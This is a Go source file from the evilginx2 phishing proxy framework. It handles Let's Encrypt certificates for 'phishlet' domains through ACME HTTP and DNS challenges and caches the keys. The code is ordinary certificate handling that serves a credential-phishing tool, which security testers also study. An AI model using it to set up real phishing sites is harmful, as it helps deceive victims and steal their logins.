package core

import (
	"crypto"
	"crypto/rand"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"encoding/pem"
	"fmt"
	"github.com/xenolf/lego/acme"
	"io/ioutil"
	"os"
	"path/filepath"

	"github.com/kgretzky/evilginx2/log"
)

type CertDb struct {
	PrivateKey *rsa.PrivateKey
	client     *acme.Client
	certUser   CertUser
	dataDir    string
	ns         *Nameserver
	hs         *HttpServer
	cfg        *Config
	cache      map[string]map[string]*tls.Certificate
}

type CertUser struct {
	Email        string
	Registration *acme.RegistrationResource
	key          crypto.PrivateKey
}

func (u CertUser) GetEmail() string {
	return u.Email
}

func (u CertUser) GetRegistration() *acme.RegistrationResource {
	return u.Registration
}

func (u CertUser) GetPrivateKey() crypto.PrivateKey {
	return u.key
}

type HTTPChallenge struct {
	crt_db *CertDb
}

func (ch HTTPChallenge) Present(domain, token, keyAuth string) error {
	ch.crt_db.hs.AddACMEToken(token, keyAuth)
	return nil
}

func (ch HTTPChallenge) CleanUp(domain, token, keyAuth string) error {
	ch.crt_db.hs.ClearACMETokens()
	return nil
}

type DNSChallenge struct {
	crt_db *CertDb
}

func (ch DNSChallenge) Present(domain, token, keyAuth string) error {
	fqdn, val, ttl := acme.DNS01Record(domain, keyAuth)
	ch.crt_db.ns.AddTXT(fqdn, val, ttl)
	return nil
}

func (ch DNSChallenge) CleanUp(domain, token, keyAuth string) error {
	ch.crt_db.ns.ClearTXT()
	return nil
}

const acmeURL = "https://acme-v01.api.letsencrypt.org/directory"

//const acmeURL = "https://acme-staging.api.letsencrypt.org/directory"

func NewCertDb(data_dir string, cfg *Config, ns *Nameserver, hs *HttpServer) (*CertDb, error) {
	d := &CertDb{
		cfg:     cfg,
		dataDir: data_dir,
		ns:      ns,
		hs:      hs,
	}

	acme.Logger = log.NullLogger()
	d.cache = make(map[string]map[string]*tls.Certificate)

	pkey_data, err := ioutil.ReadFile(filepath.Join(data_dir, "private.key"))
	if err != nil {
		// private key corrupted or not found, recreate and delete all public certificates
		os.RemoveAll(filepath.Join(data_dir, "*"))

		d.PrivateKey, err = rsa.GenerateKey(rand.Reader, 2048)
		if err != nil {
			return nil, fmt.Errorf("private key generation failed")
		}
		pkey_data = pem.EncodeToMemory(&pem.Block{
			Type:  "RSA PRIVATE KEY",
			Bytes: x509.MarshalPKCS1PrivateKey(d.PrivateKey),
		})
		err = ioutil.WriteFile(filepath.Join(data_dir, "private.key"), pkey_data, 0600)
		if err != nil {
			return nil, err
		}
	} else {
		block, _ := pem.Decode(pkey_data)
		if block == nil {
			return nil, fmt.Errorf("private key is corrupted")
		}

		d.PrivateKey, err = x509.ParsePKCS1PrivateKey(block.Bytes)
		if err != nil {
			return nil, err
		}
	}

	d.certUser = CertUser{
		Email: "", //hostmaster@" + d.cfg.GetBaseDomain(),
		key:   d.PrivateKey,
	}

	d.client, err = acme.NewClient(acmeURL, &d.certUser, acme.RSA2048)
	if err != nil {
		return nil, err
	}

	return d, nil
}

func (d *CertDb) Reset() {
	d.certUser.Email = "" //hostmaster@" + d.cfg.GetBaseDomain()
}

func (d *CertDb) SetupCertificate(site_name string, domains []string) error {
	base_domain, ok := d.cfg.GetSiteDomain(site_name)
	if !ok {
		return fmt.Errorf("phishlet '%s' not found", site_name)
	}

	err := d.loadCertificate(site_name, base_domain)
	if err != nil {
		log.Warning("failed to load certificate files for phishlet '%s', domain '%s': %v", site_name, base_domain, err)
		log.Info("requesting SSL/TLS certificates from LetsEncrypt...")
		err = d.obtainCertificate(site_name, base_domain, domains)
		if err != nil {
			return err
		}
	}
	return nil
}

func (d *CertDb) GetCertificate(site_name string, base_domain string) (*tls.Certificate, error) {
	m, ok := d.cache[base_domain]
	if ok {
		cert, ok := m[site_name]
		if ok {
			return cert, nil
		}
	}
	return nil, fmt.Errorf("certificate for phishlet '%s' and domain '%s' not found", site_name, base_domain)
}

func (d *CertDb) addCertificate(site_name string, base_domain string, cert *tls.Certificate) {
	_, ok := d.cache[base_domain]
	if !ok {
		d.cache[base_domain] = make(map[string]*tls.Certificate)
	}
	d.cache[base_domain][site_name] = cert
}

func (d *CertDb) loadCertificate(site_name string, base_domain string) error {
	crt_dir := filepath.Join(d.dataDir, base_domain)

	cert, err := tls.LoadX509KeyPair(filepath.Join(crt_dir, site_name+".crt"), filepath.Join(crt_dir, site_name+".key"))
	if err != nil {
		return err
	}
	d.addCertificate(site_name, base_domain, &cert)
	return nil
}

func (d *CertDb) obtainCertificate(site_name string, base_domain string, domains []string) error {
	if err := CreateDir(filepath.Join(d.dataDir, base_domain), 0700); err != nil {
		return err
	}
	crt_dir := filepath.Join(d.dataDir, base_domain)

	httpChallenge := HTTPChallenge{crt_db: d}
	d.client.SetChallengeProvider(acme.HTTP01, &httpChallenge)

	reg, err := d.client.Register()
	if err != nil {
		return err
	}
	d.certUser.Registration = reg
	err = d.client.AgreeToTOS()
	if err != nil {
		return err
	}

	cert_res, fails := d.client.ObtainCertificate(domains, true, nil, false)
	if len(fails) > 0 {
		for domain, err := range fails {
			log.Error("[%s] %v", domain, err)
		}
		return fmt.Errorf("failed to obtain certificates")
	}

	cert, err := tls.X509KeyPair(cert_res.Certificate, cert_res.PrivateKey)
	if err != nil {
		return err
	}
	d.addCertificate(site_name, base_domain, &cert)

	err = ioutil.WriteFile(filepath.Join(crt_dir, site_name+".crt"), cert_res.Certificate, 0600)
	if err != nil {
		return err
	}
	err = ioutil.WriteFile(filepath.Join(crt_dir, site_name+".key"), cert_res.PrivateKey, 0600)
	if err != nil {
		return err
	}

	return nil
}
